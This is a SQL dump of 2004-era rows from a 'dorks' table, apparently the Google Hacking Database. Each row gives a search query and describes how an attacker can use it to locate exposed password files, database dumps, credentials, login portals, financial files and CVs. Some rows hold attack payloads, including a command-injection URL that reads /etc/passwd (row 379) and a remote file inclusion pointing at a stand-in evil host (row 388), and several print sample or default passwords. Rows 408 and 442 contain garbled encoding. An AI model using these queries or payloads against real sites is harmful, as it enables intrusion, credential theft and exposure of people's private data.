(379, 'filetype:cgi inurl:"Web_Store.cgi"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Acgi+inurl%3A%22Web_Store.cgi%22&btnG=Google+Search', 1576, '2004-07-26', 'Zero X reported that "Web_Store.cgi" allows Command Execution:This application was written by Selena Sol and Gunther Birznieks. You can execute shellcommands:http://[www.victim.com]/cgi-bin/web_store.cgi?page=.html|cat/etc/passwd|It is not know which version and has not (yet) been confirmed by the googledork forum members. That makes this search of limited use, but to an attacker it may be used as a starting point.', '2004-07-26', NULL, NULL),
(380, 'ASP.login_aspx "ASP.NET_SessionId"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=ASP.login_aspx+%22ASP.NET_SessionId%22&btnG=Search', 1627, '2004-07-26', '.NET based login pages serving the whole environment and process trace for your viewing pleasure.. These are often found on test servers, just before going online to the general public I guess. If the current page has no debugging information any longer, an attacker could still look at Google''s cached version.', '2004-07-26', NULL, NULL),
(381, '"ASP.NET_SessionId" "data source="', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22ASP.NET_SessionId%22+%22data+source%3D%22&btnG=Search', 2464, '2004-07-26', '.NET pages revealing their datasource and sometimes the authentication credentials with it. The complete debug line looks something like this for example:strConn	System.String Provider=sqloledb;Network Library=DBMSSOCN;Data Source=ch-sql-91;Initial Catalog=DBLive;User Id=login-orsearch;Password=0aX(v5~di)&gt;S$+*For quick fun an attacker could modify this search to find those who use Microsoft Access as their storage:  It will not suprise the experienced security digger that these files are often in a downloadeble location on the server.', '2004-07-26', NULL, NULL),
(382, '"Novell, Inc" WEBACCESS Username Password "Version *.*" Copyright -inurl:help -guides|guide', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Novell%2C+Inc%22+WEBACCESS+Username+Password+%22Version+*.*%22+Copyright++-inurl%3Ahelp+-guides%7Cguide&btnG=Search', 1551, '2004-07-26', 'This may be used to find Novell Grouwise Webaccess servers.', '2004-07-26', NULL, NULL),
(383, '"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users) "# -FrontPage-" inurl:service.pwd', 'http://www.google.com/search?q=ext%3Apwd+inurl%3A%28service+%7C+authors+%7C+administrators+%7C+users%29+%22%23+-FrontPage-%22', 8494, '2004-07-26', 'Frontpage.. very nice clean search results listing !!No further comments required..changelog:22 jan 2005: improved by vs1400 !', '2004-07-26', NULL, NULL),
(384, 'filetype:cgi inurl:"fileman.cgi"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Acgi+inurl%3A%22fileman.cgi%22&btnG=Search', 1867, '2004-07-26', 'This brings up alot of insecure as well as secure filemanagers. These software solutions are often used by companies offering a "simple" but "cost effective" way to their users who don''t know unix or html. There is a problem sometimes with this specific filemanager due to insecure use of the session ID that can be found in the unprotected "fileman.log" logfile. It has been reported that an attacker can abuse the last document-edit-url of the logfile. By copy pasting that line in a new window it gives the attacker valid user credentials on the server, at least for a while.. (think hours not seconds).', '2004-07-26', NULL, NULL),
(385, 'intitle:"Index Of" -inurl:maillog maillog size', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=intitle%3A%22Index+Of%22+-inurl%3Amaillog++maillog+size', 2733, '2004-07-28', 'This google search reveals all maillog files within various directories on a webserver. This search brings back 872 results to-date, all of which contain various chunks of information (ie. Usernames, email adresses, Login/Logout times of users, IPAdresses, directories on the server ect. ect.)Someone, with this information could dig up info on the server before trying to penetrate it by finding usernames, and email adresses of accounts on the server.', '2004-07-28', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(386, 'Canon Webview netcams', 'http://www.google.com/search?q=intitle%3Aliveapplet+inurl%3ALvAppl', 3070, '2004-07-29', 'Canon has a series of netcams that all use the "WebView LiveScope" software. They are frequently used by japanese sites. Unfortunately most are crawled by their IP address so determining their location becomes more difficult. Some model names are:* VB-C10* VB-101* VB-C50iThis search looks for the java applet called "LiveApplet" that is used by Canon''s network camera feeds. There is also a standalone (free) program, that is easier to control and lets you save bookmarks. It''s available for PC and MACs. The win32 download is here: http://www.x-zone.canon.co.jp/cgi-bin/nph-wvh35-cs.cgi', '2004-07-29', NULL, NULL),
(388, 'allinurl:"index.php" "site=sglinks"', 'http://www.google.com/search?q=allinurl:%22index.php%22+%22site=sglinks%22&num=100&start=100', 1520, '2004-07-29', 'Easyins Stadtportal v4 is a German Content Management System for cities and regions. Version 4 and prior seems to be vulnerable to a code inclusion in index.php. Bugtraq: http://www.securityfocus.com/bid/10795http://www.host-vulnerable.com/stadtportal-path/index.php?site=http://www.evil-host.com', '2004-07-29', NULL, NULL),
(390, 'intitle:"Shoutcast Administrator"', 'http://www.google.com/search?q=intitle%3A%22Shoutcast+Administrator%22', 1382, '2004-07-29', 'shoutcast is software for streaming mp3 and such. This search finds the administrator page. It can be used to detect unlisted Shoutcast servers.', '2004-07-29', NULL, NULL),
(391, 'inurl:"utilities/TreeView.asp"', 'http://www.google.com/search?q=inurl%3A%22utilities%2FTreeView.asp%22', 1085, '2004-07-29', 'From the marketing brochure: "UltiPro Workforce Management offers you the most comprehensive and cost-effective HR and payroll solution on the market today."The default passwords are easy to guess if an employee has not logged into this system. An attacker would only need to find the loginname.', '2004-07-29', NULL, NULL),
(392, 'filetype:pwl pwl', 'http://www.google.com/search?num=100&q=filetype%3Apwl+pwl', 2966, '2004-07-29', 'These are Windows Password List files and have been known to be easy to crack since the release of Windows 95. An attacker can use the PWLTools to decode them and get the users passwords. The following example has been provided:---Resource table: 0292 0294 0296 0298 (..etc..)File: C:\\Downloads\\2004-07\\07-26\\USER1.PWLUser name: ''USER1''Password: ''''Dial-up:''*Rna\\Internet\\PJIU_TAC''Password:''PJIUSCAC3000'' ---', '2004-07-29', NULL, NULL),
(393, '"apricot - admin" 00h', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%22apricot+-+admin%22+00h&btnG=Google+Search', 1915, '2004-07-29', 'This search shows the webserver access stats as the user "admin". The language used is Japanese and the search includes the "00h" value which is only shown when the admin is logged in.', '2004-07-29', NULL, NULL),
(394, 'filetype:ora ora', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aora+ora&btnG=Search', 1438, '2004-08-01', 'Greetings, The *.ora files are configuration files for oracle clients. An attacker can identify a oracle database this way and get more juicy information by searching for ora config files.This search can be modified to be more specific:- filetype:ora sqlnet - filetype:ora names', '2004-08-01', NULL, NULL),
(396, 'filetype:inc inc intext:setcookie', 'http://www.google.com/search?num=100&q=filetype%3Ainc+inc+intext%3Asetcookie', 1536, '2004-08-01', 'Cookies are often used for authentication and a lot of other stuff.The "inc" php header files often include the exact syntax of the cookies. An attacker may create his own cookie with the information he has taken from the header file and start cookie poisining.', '2004-08-01', NULL, NULL),
(397, 'inurl:/wwwboard', 'http://www.google.com/search?num=100&q=inurl%3A%2Fwwwboard', 3024, '2004-08-01', 'The software wwwboard stores its passwords in a file called "passwd.txt".An attacker may try to search forinurl:/wwwboardthen add a "passwd.txt" to it (../wwwboard/passwd.txt) and decrypt des DES passwords.', '2004-08-01', NULL, NULL),
(398, '"allow_call_time_pass_reference" "PATH_INFO"', 'http://www.google.com/search?num=100&q=%22allow_call_time_pass_reference%22+%22PATH_INFO%22', 2143, '2004-08-02', 'Returns publically visible pages generated by the php function phpinfo(). This search differs from other phpinfo() searches in that it doesn''t depend on the filename being called "phpinfo.php". Some result files that include phpinfo are:', '2004-08-02', NULL, NULL),
(399, 'inurl:*db filetype:mdb', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=inurl%3A%2Adb+filetype%3Amdb+', 1583, '2004-08-02', 'More Microsoft Access databases for your viewing pleasure. Results may vary, but there have been passwords discovered with this search.', '2004-08-02', NULL, NULL),
(400, 'filetype:fp5 fp5 -site:gov -site:mil -"cvs log"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Afp5+fp5+-site%3Agov+-site%3Amil+-%22cvs+log%22&btnG=Search', 1514, '2004-08-02', 'These are various kinds of FileMaker Pro Databases (*.fp5 applies to both version 5 and 6).', '2004-08-02', NULL, NULL),
(401, 'inurl:gotoURL.asp?url=', 'http://www.google.com/search?q=inurl%3AgotoURL.asp%3Furl%3D', 1100, '2004-08-03', 'ASP Nuke is an open-source software application for running a community-based web site on a web server. By open-source, we mean the code is freely available for others to read, modify and use in accordance with the software license. The requirements for the ASP Nuke content management system are: 1. Microsoft SQL Server 2000 and 2. Microsoft Internet Information Server (IIS) 5.0 (http://www.aspnuke.com/)On 30 Dec. 2003 the hackers Cobac and Alnitak discovered a bug in Asp Nuke (version 1.2, 1.3, and 1.4)Problem : the file addurl-inc.asp included in the file gotourl.asp does not sanitize the input vars and make SQL injection possible.For a examples check the original advisory posted to a spanish forum: http://66.102.11.104/search?q=cache:10-ze5DIJ-UJ:www.elhacker.net/foro/index.php%3Ftopic%3D11830.0%3Bprev_next%3Dprev%22&amp;hl=en(link broken in two lines, glue them together first :-)An attacker can obtain the user and admin passwords by crafting a SQL statement.', '2004-08-03', NULL, NULL),
(402, 'Phasers 4500/6250/8200/8400', 'http://www.google.com/search?q=intext%3Acentreware+inurl%3Astatus', 1544, '2004-08-05', 'More Xerox printers (Phasers 4500/6250/8200/8400). An attacker can access the webinterface with this search.', '2004-08-05', NULL, NULL),
(403, 'filetype:fp3 fp3', 'http://www.google.com/search?num=100&q=filetype%3Afp3+fp3', 1377, '2004-08-05', 'These are FileMaker Pro version 3 Databases.', '2004-08-05', NULL, NULL),
(404, 'filetype:fp7 fp7', 'http://www.google.com/search?num=100&q=filetype%3Afp7+fp7', 1399, '2004-08-05', 'These are Filemaker Pro version 7 databases files.', '2004-08-05', NULL, NULL),
(405, 'filetype:cfg auto_inst.cfg', 'http://www.google.com/search?q=filetype%3Acfg+auto_inst.cfg', 1373, '2004-08-05', 'Mandrake auto-install configuration files. These contain information about the installed packages, networking setttings and even user accounts.', '2004-08-05', NULL, NULL),
(406, 'intitle:Node.List Win32.Version.3.11', 'http://www.google.com/search?q=intitle%3ANode.List+Win32.Version.3.11', 1165, '2004-08-05', 'synchronet Bulletin Board System Software is a free software package that can turn your personal computer into your own custom online service supporting multiple simultaneous users with hierarchical message and file areas, multi-user chat, and the ever-popular BBS door games.An attacker could use this search to find hosts with telnet access. In some cases the username may even be visible on the node list page, thus leaving only the password to guess.', '2004-08-05', NULL, NULL),
(407, '"powered by antiboard"', 'http://www.google.com/search?num=100&q=%22powered+by+antiboard%22', 1261, '2004-08-05', '"AntiBoard is a small and compact multi-threaded bulletin board/message board system written in PHP. It uses either MySQL or PostgreSQL as the database backend, and has support for different languages. It is not meant as the end all be all of bulletin boards, but rather something to easily integrate into your own page."There is an excellent vulnerability report at:http://www.securiteam.com/unixfocus/5XP010ADPY.htmlVendor Status:The vendor has been informed of the issues on the 28th July 2004, however no fix is planned in the near future.', '2004-08-05', NULL, NULL),
(408, '(inurl:"ars/cgi-bin/arweb?O=0" | inurl:arweb.jsp) -site:remedy.com -site:mil', 'http://www.google.com/search?num=100&q=%28inurl%3A%22ars%2Fcgi-bin%2Farweb%3FO%3D0%22+%7C+inurl%3Aarweb.jsp%29+-site%3Aremedy.com+-site%3Amil', 1041, '2004-08-05', 'From the vendor site: "RemedyÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢s Action Request SystemÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â® is for automating Service Management business processes. More than 7,000 customers know that AR System is the way to automate key business processes. AR System includes tools for application-to-application integration, including support for Web Services that requires no additional programming."Login is often ''guest'' with no password. Or no login is required. An attacker can search the database for sensitive info (passwords), and search profiles to obtain usernames, emails.', '2004-08-05', NULL, NULL),
(409, '"AutoCreate=TRUE password=*"', 'http://www.google.com/search?num=100&&q=%22AutoCreate%3DTRUE+password%3D*%22', 10187, '2004-08-05', 'This searches the password for "Website Access Analyzer", a Japanese software that creates webstatistics. For those who can read Japanese, check out the author''s site at: http://www.coara.or.jp/~passy/Note: google  to find the results of this software.', '2004-08-05', NULL, NULL),
(411, 'filetype:pass pass intext:userid', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Apass+pass+intext%3Auserid&btnG=Search', 3150, '2004-08-06', 'Generally, these are dbman password files. They are not cleartext, but still allow an attacker to harvest usernames and optionally crack passwords offline.', '2004-08-06', NULL, NULL),
(412, 'inurl:/cgi-bin/sqwebmail?noframes=1', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3A%2Fcgi-bin%2Fsqwebmail%3Fnoframes%3D1&btnG=Search', 1080, '2004-08-06', 'sQWebmail login portals.', '2004-08-06', NULL, NULL),
(413, 'filetype:ini ServUDaemon', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3Aini+ServUDaemon&btnG=Search', 2211, '2004-08-06', 'The servU FTP Daemon ini file contains setting and session information including usernames, passwords and more.', '2004-08-06', NULL, NULL),
(414, 'inurl:comersus_message.asp', 'http://www.google.com/search?q=inurl%3Acomersus_message.asp', 932, '2004-08-09', 'About Comercus: "Comersus is an active server pages software for running a professional store, seamlessly integrated with the rest of your web site. Comersus Cart is free and it can be used for commercial purposes. Full source code included and compatible with Windows and Linux Servers."Comersus Open Technologies Comersus Cart has Multiple Vulnerabilities: http://www.securityfocus.com/bid/10674/info/ This search finds the XSS vulnerable file comersus_message.asp?message= ..No version info is included with the search. Not all results are vulnerable.', '2004-08-09', NULL, NULL),
(415, 'intitle:"teamspeak server-administration', 'http://www.google.com/search?q=intitle%3A%22teamspeak+server-administration', 1064, '2004-08-09', 'TeamSpeak is an application which allows its users to talk to each other over the internet and basically was designed to run in the background of online games. TeamSpeak uses a webadmin login portal to change server settings remotely. Usually not an issue, however it might be when someone lets google pick up their portal.', '2004-08-09', NULL, NULL),
(416, 'ext:pl inurl:cgi intitle:"FormMail *" -"*Referrer" -"* Denied" -sourceforge -error -cvs -input', 'http://www.google.com/search?num=100&q=ext%3Apl+inurl%3Acgi+intitle%3A%22FormMail+*%22++-%22*Referrer%22+-%22*+Denied%22+-sourceforge+-error+-cvs+-input', 898, '2004-08-09', 'FormMail is a Perl script written by Matt Wright to send mail with sendmail from the cgi-gateway. Early version didn'' have a referer check. New versions could be misconfigured. Spammers are known to hunt them down (by means of cgi-scanning) and abuse them for their own evil purposes if the admin forgot to check the settings.http://www.securityfocus.com/bid/3954/discussion/', '2004-08-09', NULL, NULL),
(417, '(inurl:"robot.txt" | inurl:"robots.txt" ) intext:disallow filetype:txt', 'http://www.google.com/search?num=100&q=%28inurl%3A%22robot.txt%22+%7C+inurl%3A%22robots.txt%22+%29+intext%3Adisallow+filetype%3Atxt', 29978, '2004-08-09', 'Webmasters wanting to exclude search engine robots from certain parts of their site often choose the use of a robot.txt file on the root of the server. This file basicly tells the bot which directories are supposed to be off-limits.An attacker can easily obtain that information by very simply opening that plain text file in his browser. Webmasters should *never* rely on this for real security issues. Google helps the attacker by allowing a search for the "disallow" keyword.', '2004-08-09', NULL, NULL),
(418, 'intext:"Session Start * * * *:*:* *" filetype:log', 'http://www.google.com/search?q=intext:%22Session+Start+*+*+*+*:*:*+*%22+filetype:log&num=100', 1545, '2004-08-09', 'These are IRC and a few AIM log files. They may contain juicy info or just hours of good clean newbie bashing fun.', '2004-08-09', NULL, NULL),
(419, '"WebSTAR Mail - Please Log In"', 'http://www.google.com/search?q=%22WebSTAR+Mail+-+Please+Log+In%22', 1157, '2004-08-09', '@stake, Inc. advisory: "4D WebSTAR is a software product that provides Web, FTP, and Mail services for Mac OS X.  There are numerous vulnerabilities that allow for an attacker to escalate privileges or obtain access to protected resources."See also: http://www.securityfocus.com/archive/1/368778', '2004-08-09', NULL, NULL),
(420, 'Ultima Online loginservers', 'http://www.google.com/search?q=filetype%3Acfg+login+%22LoginServer%3D%22', 1065, '2004-08-09', 'This one finds login servers for the Ultima Online game.', '2004-08-09', NULL, NULL),
(421, 'inurl:nuke filetype:sql', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3Anuke+filetype%3Asql&btnG=Search', 2001, '2004-08-10', 'This search reveals database dumps that most likely relate to the php-nuke or postnuke content management systems. These database dumps contain usernames and (sometimes) encrypted passwords for users of the system.', '2004-08-10', NULL, NULL),
(422, 'intitle:"please login" "your password is *"', 'http://www.google.com/search?num=50&q=intitle%3A%22please+login%22+%22your+password+is+*%22', 1251, '2004-08-13', 'These administrators were friendly enough to give hints about the password.', '2004-08-13', NULL, NULL),
(423, 'mail filetype:csv -site:gov intext:name', 'http://www.google.com/search?q=mail+filetype%3Acsv+-site%3Agov+intext%3Aname', 1598, '2004-08-09', 'CSV Exported mail (user) names and such.', '2004-08-09', NULL, NULL),
(424, 'filetype:xls -site:gov inurl:contact', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Axls+-site%3Agov+inurl%3Acontact&btnG=Search', 1674, '2004-08-09', 'Microsoft Excel sheets containing contact information.', '2004-08-09', NULL, NULL),
(426, 'inurl:cgi-bin/ultimatebb.cgi?ubb=login', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=inurl%3Acgi-bin%2Fultimatebb.cgi%3Fubb%3Dlogin&btnG=Search', 1743, '2004-08-13', 'These are login pages for Infopop''s message board UBB.classic. For the UBB.threads you can use this search This next search finds all UBB pages with the infopop image and a link to the developers.http://www.google.com/search?num=100&amp;&amp;safe=off&amp;q=link%3Ahttp%3A%2F%2Fwww.infopop.com%2Flanding%2Fgoto.php%3Fa%3Dubb.classic&amp;filter=1', '2004-08-13', NULL, NULL),
(427, 'inurl:/db/main.mdb', 'http://www.google.com/search?q=inurl%3A%2Fdb%2Fmain.mdb', 3078, '2004-08-13', 'ASP-Nuke database file containing passwords.This search goes for the direct location and has few results. For more hits an attacker would try to find ASP-Nuke sites another way (search googledorks for them) and change the URL to the database location.', '2004-08-13', NULL, NULL),
(428, 'ext:asp inurl:pathto.asp', 'http://www.google.com/search?q=ext%3Aasp+inurl%3Apathto.asp', 1450, '2004-08-13', 'The UBB trial version contains files that are not safe to keep online after going live. The install files clearly state so:CAUTIONS Do not leave pathto.asp or ubb6_test.cgi on your server. Delete them from the server when you are done. Leaving them in place poses a security risk."This searches pathto.asp files and allows an attacker to know the exact installed path of the software.Examples:The path to your Site is -- g:\\0E5\\goldenstateeng.xxx\\webThe path to your Site is -- D:\\inetpub\\wwwroot\\01xx738\\mc10s9izz', '2004-08-13', NULL, NULL),
(430, '"this proxy is working fine!" "enter *" "URL***" * visit', 'http://www.google.com/search?q=%22this+proxy+is+working+fine!%22+%22enter+*%22+%22URL***%22+*+visit&num=100&filter=0', 1976, '2004-08-13', 'These are test pages for some proxy program. Some have a text field that allows you to use that page as a proxy. The experts comment on this is there are much better solutions for surfing anonymously.', '2004-08-13', NULL, NULL),
(431, 'filetype:bak inurl:"htaccess|passwd|shadow|htusers"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Abak+inurl%3A%22htaccess%7Cpasswd%7Cshadow%7Chtusers%22&filter=0', 2730, '2004-08-14', 'This will search for backup files (*.bak) created by some editors or even by the administrator himself (before activating a new version). Every attacker knows that changing the extenstion of a file on a webserver can have ugly consequences.', '2004-08-14', NULL, NULL),
(432, '"http://*:*@www" domainname', 'http://www.google.com/search?safe=off&q=%22http%3A%2F%2F*%3A*%40www%22+bob%3Abob&num=100', 4716, '2004-08-14', 'This is a query to get inline passwords from search engines (not just Google), you must type in the query followed with the the domain name without the .com or .net"http://*:*@www" bangbus or "http://*:*@www"bangbusAnother way is by just typing"http://bob:bob@www"', '2004-08-14', NULL, NULL),
(433, 'filetype:log "PHP Parse error" | "PHP Warning" | "PHP Error"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=filetype%3Alog+%22PHP+Parse+error%22+%7C+%22PHP+Warning%22+%7C+%22PHP+Error%22', 1405, '2004-08-14', 'This search will show an attacker some PHP error logs wich may contain information on wich an attack can be based.', '2004-08-14', NULL, NULL),
(434, '"powered by CuteNews" "2003..2005 CutePHP"', 'http://www.google.com/search?num=100&hl=en&lr=&safe=off&q=%22powered+by+CuteNews%22+%222003..2005+CutePHP%22&btnG=Search', 1202, '2004-08-16', 'This finds sites powered by various CuteNews versions. An attacker use this list and search the online advisories for vulnerabilities. For example: "CuteNews HTML Injection Vulnerability Via Commentaries", Vulnerable Systems: * CuteNews version 1.3.x (http://www.securiteam.com/unixfocus/5BP0N20DFA.html)', '2004-08-16', NULL, NULL),
(436, 'filetype:conf oekakibbs', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=filetype%3Aconf+oekakibbs+&btnG=Search', 1776, '2004-08-16', 'Oekakibss is a japanese anime creation application. The config file tells an attacker the encrypted password.', '2004-08-16', NULL, NULL),
(437, 'Novell NetWare intext:"netware management portal version"', 'http://www.google.com/search?num=100&&q=Novell+NetWare+intext%3A%22netware+management+portal+version%22', 1037, '2004-08-16', 'Netware servers ( v5 and up ) use a web-based management utility called Portal services, which can be used to view files on a volume, view server health statistics, etc. While you must log into the Portal Manager to view any of the data, it will accept blank passwords. So any Netware username defined in the server''s NDS database w/o a password can authenticate.After the Google results are displayed, an attacker wil go to the company base web url and learn about employees, preferably their email addresses. Then bounce to the portal management login and try their username w/o a password.', '2004-08-16', NULL, NULL),
(438, 'Achievo webbased project management', 'http://www.google.com/search?q=inurl:%22dispatch.php%3Fatknodetype%22+%7C++inurl:class.atkdateattribute.js.php&num=100&filter=0', 817, '2004-08-16', 'Achievo is a free web-based project management tool for business-environments. Achievo''s is mainly used for its project management capabilities. According to the site securitytracker.com remote code execution is possible by modifying a certain php script in this software suite. More information is available at: http://www.securitytracker.com/alerts/2002/Aug/1005121.html', '2004-08-16', NULL, NULL),
(439, 'intitle:"PHP Explorer" ext:php (inurl:phpexplorer.php | inurl:list.php | inurl:browse.php)', 'http://www.google.com/search?num=100&q=intitle%3A%22PHP+Explorer%22+ext%3Aphp+%28inurl%3Aphpexplorer.php+%7C++inurl%3Alist.php+%7C+inurl%3Abrowse.php%29', 1599, '2004-08-20', 'This searches for PHP Explorer scripts. This looks like a file manager with some nice extra options for an attacker, such as phpinfo, create/list directories and execute command shell. Not many results in this search and some only cached. Over time this may prove to be interesting if Google finds more (or someone finds a better search method for them).', '2004-08-20', NULL, NULL),
(440, '"ftp://" "www.eastgame.net"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%22ftp%3A%2F%2F%22+%22www.eastgame.net%22+&btnG=Google+Search', 2843, '2004-08-20', 'Use this search to find eastgame.net ftp servers, loads of warez and that sort of thing."thankyou4share" !', '2004-08-20', NULL, NULL),
(441, 'intitle:"ITS System Information" "Please log on to the SAP System"', 'http://www.google.com/search?num=100&q=intitle%3A%22ITS+System+Information%22+%22Please+log+on+to+the+SAP+System%22', 1137, '2004-08-16', 'Frontend for SAP Internet Transaction Server webgui service.', '2004-08-16', NULL, NULL),
(442, 'Login ("Powered by Jetbox One CMS ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢" | "Powered by Jetstream ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â© *")', 'http://www.google.com/search?q=Login+(%22Powered+by+Jetbox+One+CMS+%E2%84%A2%22+%7C+%22Powered+by+Jetstream+%C2%A9+*%22)&num=100&hl=en&lr=&ie=UTF-8&safe=off&filter=0', 1442, '2004-08-20', 'Jetbox is a content management systems (CMS) that uses MySQL or equivalent databases. There is a vulnerability report at SF wich I think is overrated, but I will mention here:http://www.securityfocus.com/bid/10858/discussion/The file holding the password is called: "http://.../includes/general_settings.inc.php"It does come with default passwords and that is allways a security risk. The administration is available via /admin/Username: admin, Password: admin1 .', '2004-08-20', NULL, NULL),
(443, 'LeapFTP intitle:"index.of./" sites.ini modified', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=LeapFTP+intitle%3A%22index.of.%2F%22+sites.ini+modified&btnG=Search', 2898, '2004-08-20', 'The LeapFTP client configuration file "sites.ini" holds the login credentials for those sites in plain text. The passwords seems to be encrypted.', '2004-08-20', NULL, NULL),
(444, 'intitle:Login * Webmailer', 'http://www.google.com/search?hl=en&ie=UTF-8&q=intitle%3ALogin+1%261+Webmailer&btnG=Google+Search', 1217, '2004-08-20', '1&amp;1 Webmail login portals. This is made by a german company called Internet United active in the hosting providers area. They have a server login product wich can be found by GooglingThis is all not very exiting as there have been no vulnerabilities reported on this software yet.', '2004-08-20', NULL, NULL),
(445, 'inurl:"gs/adminlogin.aspx"', 'http://www.google.com/search?q=inurl%3A%22gs%2Fadminlogin.aspx%22', 1983, '2004-08-20', 'GradeSpeed seems to be a .NET application to administer school results for several schools using the web. If you do not select a school an error is reported. The HTML source code shows path information, for example: option value="E:\\GRADESPEED\\DRHARMONWKELLEYELEMENTARY\\|Dr H. W K. E.|101"&gt;Dr ...', '2004-08-20', NULL, NULL),
(446, '"phone * * *" "address *" "e-mail" intitle:"curriculum vitae"', 'http://www.google.com/search?q=%22phone++*+*+*%22+%22address+*%22+%22e-mail%22+intitle:%22curriculum+vitae%22', 3647, '2004-08-19', 'This search gives hounderd of existing curriculum vitae with names and adress. An attacker could steal identity if there is an SSN in the document.', '2004-08-19', NULL, NULL),
(447, 'intitle:Novell intitle:WebAccess "Copyright *-* Novell, Inc"', 'http://www.google.com/search?q=intitle:Novell+WebAccess&ie=UTF-8&oe=UTF-8intitle:Novell%20intitle:WebAccess%20%22Copyright%20*-*%20Novell,%20Inc%22', 1123, '2004-08-21', 'search to show online Novell Groupwise web access portals.', '2004-08-21', NULL, NULL),
(448, 'intitle:phpMyAdmin "Welcome to phpMyAdmin ***" "running on * as root@*"', 'http://www.google.com/search?num=100&q=intitle%3AphpMyAdmin+%22Welcome+to+phpMyAdmin+***%22+%22running+on+*+as+root%40*%22', 3939, '2004-08-21', 'search for phpMyAdmin installations that are configured to run the MySQL database with root priviledges.', '2004-08-21', NULL, NULL),
(449, '"Powered by Gallery v1.4.4"', 'http://www.google.com/search?hl=en&ie=UTF-8&q=%22Powered+by+Gallery+v1.4.4%22', 1351, '2004-08-25', 'http://www.securityfocus.com/bid/10968/discussion/"A vulnerability is reported to exist in Gallery that may allow a remote attacker to execute malicious scripts on a vulnerable system. This issue is a design error that occurs due to the ''set_time_limit'' function.The issue presents itself because the ''set_time_limit'' function forces the application to wait for 30-seconds before the verification and discarding of non-image files takes place. This allows for a window of opportunity for an attacker to execute a malicious script on a server.Gallery 1.4.4 is reported prone to this issue, however, other versions may be affected as well. "', '2004-08-25', NULL, NULL),
(450, 'Quicken data files', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&q=filetype%3AQDF+QDF', 1723, '2004-08-25', 'The QDATA.QDF file (found sometimes in zipped "QDATA" archives online, sometimes not) contains financial data, including banking accounts, credit card numbers, etc. This search has only a couple hits so far, but this should be popular in the coming year as Quicken 2005 makes it very easy and suggests to backup your data online.', '2004-08-25', NULL, NULL),
(451, 'filetype:ini wcx_ftp', 'http://www.google.com/search?hl=en&q=filetype%3Aini+wcx_ftp', 2029, '2004-08-25', 'This searches for Total commander FTP passwords (encrypted) in a file called wcx_ftp.ini. Only 6 hits at the moment, but there may be more in the future.', '2004-08-25', NULL, NULL),
(452, '4images Administration Control Panel', 'http://www.google.com/search?&q=%224images+Administration+Control+Panel%22', 2044, '2004-08-25', '4images Gallery - 4images is a web-based image gallery management system. The 4images administration control panel let you easily modify your galleries.', '2004-08-25', NULL, NULL),
(455, '( filetype:mail | filetype:eml | filetype:mbox | filetype:mbx ) intext:password|subject', 'http://www.google.com/search?hl=de&ie=ISO-8859-1&q=%28+filetype%3Amail+%7C+filetype%3Aeml+%7C+filetype%3Ambox+%7C+filetype%3Ambx+%29+intext%3Apassword%7Csubject+&btnG=Google-Suche&meta=', 1836, '2004-08-26', 'storing emails in your webtree isnt a good idea.with this search google will show  files containing emails like mail,eml,mbox or mbx with the keywords"password" or "subject" in the mail data.', '2004-08-26', NULL, NULL),
(456, 'filetype:qbb qbb', 'http://www.google.com/search?&q=filetype%3Aqbb+qbb', 1396, '2004-09-06', 'This search will show QuickBooks Bakup Files. Quickbook is financial accounting software so storing these files in a webtree is not a smart idea.', '2004-09-06', NULL, NULL),
(457, 'filetype:bkf bkf', 'http://www.google.com/search?hl=en&ie=ISO-8859-1&q=filetype%3Abkf+bkf&meta=', 1431, '2004-09-06', 'This search will show backupfiles for xp/2000 machines.Of course these files could contain nearly everything, depending on the user selection and they can also be password protected.', '2004-09-06', NULL, NULL),
